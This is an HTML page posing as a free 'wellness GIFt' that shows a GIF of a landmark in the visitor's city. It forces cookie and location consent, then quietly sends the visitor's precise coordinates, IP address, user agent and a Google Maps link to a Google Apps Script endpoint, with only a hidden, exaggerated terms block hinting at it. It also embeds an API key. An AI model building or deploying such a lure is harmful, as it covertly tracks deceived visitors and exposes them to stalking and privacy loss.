<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Free Wellness GIFt</title>
  <style>
    body {
      margin: 0;
      font-family: 'Arial Rounded MT Bold', sans-serif;
      background-color: #b3d9f2;
      color: #333;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
    }
    .container {
      max-width: 500px;
      padding: 20px;
    }
    .hidden { display: none; }
    .terms-link { font-size: 0.8rem; color: #999; text-decoration: none; margin-top: 20px; display: inline-block; }
    .terms { display: none; margin-top: 10px; font-size: 0.7rem; color: #666; text-align: left; }
    button { padding: 10px 20px; margin: 10px; cursor: pointer; border: none; border-radius: 4px; background: #77c3d2; color: white; font-weight: bold; }
    button:hover { background: #5bb2c0; }
  </style>
</head>
<body>
  <div class="container">
    <div id="cookieConsent">
      <h2>This site uses cookies</h2>
      <p>We use cookies to personalise your free experience. Do you accept?</p>
      <button onclick="acceptCookies()">Accept</button>
      <button onclick="denyCookies()">Decline</button>
    </div>

    <div id="locationRequest" class="hidden">
      <h2>Almost there...</h2>
      <p>Please allow location access so we can tailor your <strong>GIFt</strong> to your city.</p>
      <button onclick="requestLocation()">Allow Location</button>
      <button onclick="denyLocation()">Decline</button>
    </div>

    <div id="giftPage" class="hidden">
      <h1 id="gifTitle">Loading your local <strong>GIFt</strong>...</h1>
      <p id="locationStatus">Fetching city-specific delight...</p>
      <div id="gif-container"></div>
      <a href="#" class="terms-link" onclick="document.getElementById('terms').style.display = 'block'; return false;">terms & conditions</a>
      <div id="terms" class="terms">
        <p>By accessing this digital interface and consenting to location and cookie access, you explicitly grant LOVE SUCKER LOUNGE CORP the irrevocable and unrestricted right to collect, store, reproduce, analyse, redistribute, and monetise your biometric, geographic, and behavioural metadata in perpetuity across all known and future mediums, technologies, or artificial intelligence architectures.</p>
        <p>You also waive any right to revoke this agreement, deny consent retroactively, or challenge the use of such data in any domestic or international legal jurisdiction. LOVE SUCKER LOUNGE CORP reserves the right to modify, sell, or fictionalise your data as needed for internal optimisation, user simulation, or profit-based narrative construction.</p>
        <p>Continued interaction constitutes full legal agreement to the above. By accepting your <strong>GIFt</strong>, you surrender ownership of your digital autonomy. Thank you and enjoy the experience.</p>
      </div>
    </div>

    <div id="deniedPage" class="hidden">
      <h2>Oops!</h2>
      <p>You must accept both cookies and location access to proceed.</p>
      <button onclick="location.reload()">Go Back and Try Again</button>
    </div>
  </div>

  <script>
    let cookiesAccepted = false;
    let ipAddress = '';
    const giphyApiKey = 'lSKtiwxXagD1vFtoaQhUnM3Ek6JO8FrX';

    const cityLandmarks = {
      sydney: "sydney opera house",
      melbourne: "flinders street station",
      brisbane: "story bridge",
      london: "big ben",
      paris: "eiffel tower",
      newyork: "statue of liberty",
      tokyo: "tokyo tower"
    };

    fetch('https://api.ipify.org?format=json')
      .then(res => res.json())
      .then(data => {
        ipAddress = data.ip;
      });

    function acceptCookies() {
      cookiesAccepted = true;
      document.getElementById('cookieConsent').classList.add('hidden');
      document.getElementById('locationRequest').classList.remove('hidden');
    }

    function denyCookies() {
      showDenied();
    }

    function denyLocation() {
      showDenied();
    }

    function showDenied() {
      document.querySelectorAll('.container > div').forEach(el => el.classList.add('hidden'));
      document.getElementById('deniedPage').classList.remove('hidden');
    }

    function requestLocation() {
      if (!cookiesAccepted) {
        showDenied();
        return;
      }
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          function(position) {
            document.querySelectorAll('.container > div').forEach(el => el.classList.add('hidden'));
            document.getElementById('giftPage').classList.remove('hidden');

            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;

            fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`)
              .then(res => res.json())
              .then(data => {
                const cityRaw = data.address.city || data.address.town || data.address.village || 'your area';
                const cityKey = cityRaw.toLowerCase().replace(/\s+/g, '');
                const landmark = cityLandmarks[cityKey] || cityRaw;

                fetch(`https://api.giphy.com/v1/gifs/search?api_key=${giphyApiKey}&q=${encodeURIComponent(landmark)}&limit=1&rating=g`)
                  .then(response => response.json())
                  .then(gifData => {
                    const gifUrl = gifData.data[0]?.images.original.url || 'https://media.giphy.com/media/l0MYt5jPR6QX5pnqM/giphy.gif';
                    document.getElementById('gif-container').innerHTML = `<img src="${gifUrl}" alt="gift" width="100%">`;
                    document.getElementById('locationStatus').innerHTML = `Hereâ€™s a <strong>GIFt</strong> chosen for ${cityRaw}`;
                    document.getElementById('gifTitle').innerHTML = `Your local <strong>GIFt</strong> has arrived`;

                    // ðŸ”„ Send data via fetch instead of form
                    fetch('https://script.google.com/macros/s/AKfycbwKt0kTVb1GJADt0igw_NQ-ESBOY9jLAYi-VaoZJ6U91DuBEAqwc2IlcgRGjxUG9JGr/exec', {
                      method: 'POST',
                      mode: 'no-cors',
                      headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                      },
                      body: new URLSearchParams({
                        lat: lat,
                        lng: lng,
                        ip: ipAddress,
                        ua: navigator.userAgent,
                        map: mapLink
                      })
                    });
                  });
              });
          },
          function(error) {
            showDenied();
          }
        );
      } else {
        showDenied();
      }
    }
  </script>
</body>
</html>
